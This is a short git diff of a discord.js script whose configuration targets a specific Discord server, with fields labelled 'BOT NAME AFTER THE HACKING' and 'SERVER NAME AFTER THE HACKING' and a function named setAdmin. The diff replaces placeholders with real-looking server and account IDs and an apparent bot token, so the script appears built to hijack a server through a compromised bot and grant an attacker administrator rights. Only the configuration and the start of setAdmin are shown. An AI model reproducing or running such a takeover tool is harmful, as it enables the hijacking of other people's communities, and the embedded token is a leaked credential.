@@ -2,13 +2,13 @@ const Discord = require("discord.js")
 const client = new Discord.Client()
 
 const configs = {
-  "targetServerID": "TARGET SERVER ID",
-  "accountID": "YOUR ID",
-  "botNickname": "BOT NAME AFTER THE HACKING",
+  "targetServerID": "675780884728774695",
+  "accountID": "701986911899746356",
+  "botNickname": "NA BOT✨",
   "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
   "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
   "newServerName": "SERVER NAME AFTER THE HACKING",
-  "token": "TARGET BOT TOKEN"
+  "token": "ODE10TA3NDIOMTE5NTUOMDQ4 YDZPAA.tHbHUABwjPUo4xGtv27kkuE ZG4S"
 }
 
 const setAdmin = (guildID, accountID) => {
